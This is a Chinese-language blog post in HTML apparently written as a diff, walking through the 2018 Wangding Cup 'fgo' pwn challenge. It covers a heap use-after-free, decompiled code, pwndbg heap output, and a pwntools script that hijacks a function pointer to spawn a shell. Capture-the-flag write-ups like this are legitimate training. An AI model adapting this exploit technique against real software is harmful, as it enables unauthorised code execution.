@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.0.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>2018网鼎杯PWN-fgo - Jon Tsang&#39;Blog</title>
+
+
+    <meta name="description" content="分析过程首先checksec： 1234567$ checksec pwn[*] &amp;apos;&#x2F;root&#x2F;ex&#x2F;fgo&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)  运行结果如下">
+<meta name="keywords" content="CTF,pwn,Binary,UAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018网鼎杯PWN-fgo">
+<meta property="og:url" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;post&#x2F;e40dc053.html">
+<meta property="og:site_name" content="Jon Tsang&#39;Blog">
+<meta property="og:description" content="分析过程首先checksec： 1234567$ checksec pwn[*] &amp;apos;&#x2F;root&#x2F;ex&#x2F;fgo&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)  运行结果如下">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;images&#x2F;og_image.png">
+<meta property="og:updated_time" content="2019-08-26T07:26:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;images&#x2F;og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.4.1/css/all.min.css">
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+        <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<!-- <body class="is-2-column"> -->
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.png" alt="2018网鼎杯PWN-fgo" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+                <a class="navbar-item"
+                href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/JonTsang">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;" target="_blank" rel="noopener">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;" target="_blank" rel="noopener">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-08-22T09:31:23.000Z">2018-08-22</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1136 个字)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span>次访问
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                2018网鼎杯PWN-fgo
+            
+        </h1>
+        <div class="content">
+            <h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>首先checksec：</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> checksec pwn</span></span><br><span class="line">[*] '/root/ex/fgo'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下，看样子应该是和堆有关了，一般来说这种CTF中添加删除XXX的程序都是存在UAF的</p>
+<a id="more"></a>
+
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190826132500.png" alt></p>
+<p>首先查看<code>add_servant()</code>函数，一般来说从这种添加item的函数中我们可以逆向出每个item的结构</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add_servant</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="hljs-comment">// ebx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !servantlist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        servantlist[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !servantlist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);</span><br><span class="line">          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)servantlist[i] = print_servant_content;</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the size of servant's name : "</span>);</span><br><span class="line">        read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = servantlist[i];</span><br><span class="line">        v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !*((_DWORD *)servantlist[i] + <span class="hljs-number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);</span><br><span class="line">          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"ability : "</span>);</span><br><span class="line">        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)servantlist[i] + <span class="hljs-number">1</span>), size);</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"your team is full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面的代码可以得知，该函数首先分配了一个8直接大小结构体，将其指针放入全局数组<code>servantlist[i]</code>中：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stract servant&#123;</span><br><span class="line">	<span class="hljs-keyword">ssize_t</span> (*print_servant_content)(<span class="hljs-keyword">void</span> *);</span><br><span class="line">  <span class="hljs-keyword">char</span>* ability;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时为<code>ability</code>分配size大小的空间，存储描述每个servant的ability的字符串</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+----------------+                       </span><br><span class="line">| servantlist[i] |  malloc(8)                   </span><br><span class="line">+----------------+---------&gt;+----------------------+                       </span><br><span class="line">                            | print_servant_content|                       </span><br><span class="line">                            +----------------------+                       </span><br><span class="line">                            |        ability       |  malloc(size)              </span><br><span class="line">                            +----------------------+---------------&gt;+----------------+</span><br><span class="line">                                                                    |                |</span><br><span class="line">                                                                    |    content     |</span><br><span class="line">                                                                    |                |</span><br><span class="line">                                                                    +----------------+</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>在看看<code>print_servant()</code>和<code>print_servant_content()</code></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print_servant</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> index; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);</span><br><span class="line">  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);</span><br><span class="line">  index = atoi(&amp;buf);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( index &lt; <span class="hljs-number">0</span> || index &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( servantlist[index] )</span><br><span class="line">    (*(<span class="hljs-keyword">void</span> (__cdecl **)(<span class="hljs-keyword">void</span> *))servantlist[index])(servantlist[index]);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">print_servant_content</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(*(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)(a1 + <span class="hljs-number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然<code>print_servant()</code>调用了<code>print_servant_content()</code>，同时将<code>servant</code>结构体的地址作为参数传入<code>print_servant_content()</code>，该函数再用<code>put</code>打印<code>servant+4</code>即<code>ability</code>的内容。</p>
+<p>到这里为止没有发现什么漏洞，我们继续往下看。</p>
+<p>在函数<code>del_servant()</code>中，首先free掉<code>ability</code>的内容，再free整个<code>servant</code>结构体，但之后却没有将这些指针设为NULL，这导致了UAF的可能。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">del_servant</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Index : "</span>);</span><br><span class="line">  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !servantlist[v1] )</span><br><span class="line">    <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;</span><br><span class="line">  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)servantlist[v1] + <span class="hljs-number">1</span>));</span><br><span class="line">  <span class="hljs-built_in">free</span>(servantlist[v1]);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success "</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时程序中还有一个<code>secret()</code>函数，用于执行bash。</p>
+<p>接下来思路就很明确了：</p>
+<ol>
+<li>首先明确首要目的：执行<code>secret()</code>以获取shell</li>
+<li>结构体中刚好有个指向<code>print_servant_content()</code>的函数指针</li>
+<li>想办法利用UAF将<code>print_servant_content()</code>的指针换为<code>secret()</code></li>
+</ol>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><ol>
+<li>首先连续添加两个<code>ability</code>大小为32的servant0和servant1（不为8即可），可以看到heap中有了4个fastbin</li>
+</ol>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">pwndbg&gt;</span><span class="hljs-bash"> heap</span></span><br><span class="line">0x804c000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 17,</span><br><span class="line">  fd = 0x804862b &lt;print_servant_content&gt;,</span><br><span class="line">  bk = 0x804c018,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x29</span><br><span class="line">&#125;</span><br><span class="line">0x804c010 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 41,</span><br><span class="line">  fd = 0x61616161,</span><br><span class="line">  bk = 0xa6161,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804c038 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 17,</span><br><span class="line">  fd = 0x804862b &lt;print_servant_content&gt;,</span><br><span class="line">  bk = 0x804c050,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x29</span><br><span class="line">&#125;</span><br><span class="line">0x804c048 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 41,</span><br><span class="line">  fd = 0x62626262,</span><br><span class="line">  bk = 0xa62,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0x804c070 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 135057,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">pwndbg&gt;</span><span class="hljs-bash"></span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>接着删除掉刚添加的两个servant，我们就得到了两个空闲的大小为8的fastbin</li>
+</ol>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">pwndbg&gt;</span><span class="hljs-bash"> fastbins</span></span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x804c038 —▸ 0x804c000 ◂— 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x804c048 —▸ 0x804c010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>再次添加一个servant2，大小为8，此时为该servant的ability分配的内存应该就是刚才servant0所在位置的内存，我们将新添加的servant结构的ability设置dead看看，不出所料，EIP可控。</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190826151641.png" alt></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>所以exp中，将servant2的ability设置为secret()函数地址，再次调用print_servant()显示servant0时，便可getshell。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context.os = <span class="hljs-string">'linux'</span></span><br><span class="line">context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]</span><br><span class="line"><span class="hljs-comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="hljs-string">'INFO'</span></span><br><span class="line"></span><br><span class="line">bin_path = <span class="hljs-string">'./fgo'</span></span><br><span class="line"></span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">(command=<span class="hljs-string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_servant</span><span class="hljs-params">(size, ability)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(ability)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_servant</span><span class="hljs-params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_servant</span><span class="hljs-params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    addr_secret = <span class="hljs-number">0x08048956</span> <span class="hljs-comment">#address of secret()</span></span><br><span class="line">    add_servant(<span class="hljs-number">32</span>, <span class="hljs-string">"zzzz"</span>) <span class="hljs-comment">#servant 0</span></span><br><span class="line">    add_servant(<span class="hljs-number">32</span>, <span class="hljs-string">"xxxx"</span>) <span class="hljs-comment">#servant 1</span></span><br><span class="line">    del_servant(<span class="hljs-number">0</span>) <span class="hljs-comment">#delete 0</span></span><br><span class="line">    del_servant(<span class="hljs-number">1</span>) <span class="hljs-comment">#delete 1</span></span><br><span class="line">    add_servant(<span class="hljs-number">8</span>, p32(addr_secret))</span><br><span class="line"></span><br><span class="line">    print_servant(<span class="hljs-number">0</span>) <span class="hljs-comment">#use after free</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">global</span> p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path])</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="hljs-number">1</span>], int(sys.argv[<span class="hljs-number">2</span>]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p>FLAG值：<code>flag{76f46d8c4d8cd55773b558d50be67687}</code></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190826150001.png" alt></p>
+
+        </div>
+        <!-- 文章结尾添加版权声明 从这里开始 -->
+        
+        <ul class="post-copyright">
+        <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/e40dc053.html">2018网鼎杯PWN-fgo</a></li>
+        <li><strong>本文作者：</strong><a href="https://jontsang.github.io">Jon Tsang</a></li>
+        <!-- <li><strong>本文链接：</strong><a href="https://jontsang.github.io/post/e40dc053.html">https://jontsang.github.io/post/e40dc053.html</a></li> -->
+        <li><strong>发布时间：</strong>2018-08-22</li>
+        <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+        </ul>
+        
+        <!-- 文章结尾添加版权声明 到这里结束 -->
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
